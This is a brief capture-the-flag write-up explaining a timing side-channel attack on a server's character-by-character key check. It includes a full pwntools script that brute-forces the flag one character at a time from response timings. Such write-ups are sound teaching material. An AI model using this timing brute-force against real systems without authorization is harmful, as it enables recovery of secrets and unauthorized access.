### 01/08/24

# SaaS (Misc)
#ctf 

> *really weird wordle*

The program on the server takes an inputted user string, checks if it matches the key char by char, and then returns whether or not if you are correct. Since the correct answers take slightly less time, we can try every letter, check what was fastest, and try every next letter. This is like a kinda weird breadth first binary search tree, where we just check each item and then check each branch of the next item, and so on. Here's the solution code written recursively:

*sorry for weird spacing, copy-paste was funky*

```python

#!/usr/bin/env python3

import time
from pwn import *
import string

done = False

p = remote("chal.ctf-league.osusec.org", 1320)

print(p.recvline())


def func(current):
    # Iterate all printable characters, bruteforcing
    # The current character
    current
    cool_name = {}

    for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?#$%&'()*+,-./:;<=>?@[\]^_`{|}~:":

        current_flag = current + char
        start = time.time()
        print(current_flag)
        p.sendline(current_flag)
        data = p.recvline()
        end = time.time()
        #print(end - start)

        cool_name[char] = (end - start)


        if b"got it" in data:

            print(current_flag)

            print("Ending!")

    #print(cool_name)

    new = min(cool_name, key=cool_name.get)

    print(new)

    #print(current + new)

    cool_name = {}

    func(current + new)

  

# Initial call to the recursive function

func("")
```
